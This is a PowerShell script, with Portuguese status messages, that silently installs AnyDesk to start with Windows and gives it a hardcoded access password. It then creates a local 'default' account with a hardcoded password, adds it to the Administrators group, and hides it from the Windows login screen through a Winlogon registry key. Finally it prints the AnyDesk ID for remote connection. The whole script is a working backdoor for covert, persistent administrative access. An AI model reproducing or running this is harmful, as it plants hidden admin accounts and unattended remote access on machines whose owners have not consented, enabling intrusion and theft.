  $anydesk = (Get-Service anydesk 2> $nul).Status
  if ($anydesk  -match 'stopped') {

    "[*] Anydesk ja faz parte do sistema"	 
    "[*] Ativando servico anydesk"
    cmd.exe /c 'sc.exe start anydesk > nul 2>&1' 
   
    }

   sleep 3

    "[*] Download AnyDesk"
    
    $clnt = new-object System.Net.WebClient
    $url = "http://download.anydesk.com/AnyDesk.exe"
    $file = "C:\windows\temp\AnyDesk.exe"
    $clnt.DownloadFile($url,$file)
   

    "[*] Instalando anydesk"
    cmd.exe /c "C:\windows\temp\AnyDesk.exe --install C:\Users\%USERNAME%\AppData\Local\AnyDesk --start-with-win --silent"
    
    "[*] Senha anydesk Cyber%@89"
    cmd.exe /c "echo Cyber%@89 | C:\Users\%USERNAME%\AppData\Local\AnyDesk\AnyDesk.exe --set-password"
    cmd.exe /c 'del c:\\windows\\temp\\AnyDesk.exe > nul 2>&1'

    $net = net user | findstr "default"
    if ($net -match 'default') {

    "[*] usuario default existente"
    
    }

      else

    {

    "[*] Criando usuario default"
    "[*] Senha do usuario default qchRr5Z0kE3"
    cmd.exe /c 'net user default "qchRr5Z0kE3" /add > nul 2>&1'

    "[*] Adicionando usuario default ao grupo de administradores"
    cmd.exe /c 'net localgroup Administrador default /add > nul 2>&1'
    cmd.exe /c 'reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v default /t REG_DWORD /d 0 /f > nul 2>&1' 

    }

    sleep 3
    
    cmd.exe /c "for /f ""delims="" %i in ('C:\Users\%USERNAME%\AppData\Local\AnyDesk\AnyDesk.exe --get-id') do echo %i" > ID.txt 
    $id = Get-Item -Path .\ID.txt | Get-Content -Tail 1 

    "[*] ID anydesk $id" 
 
  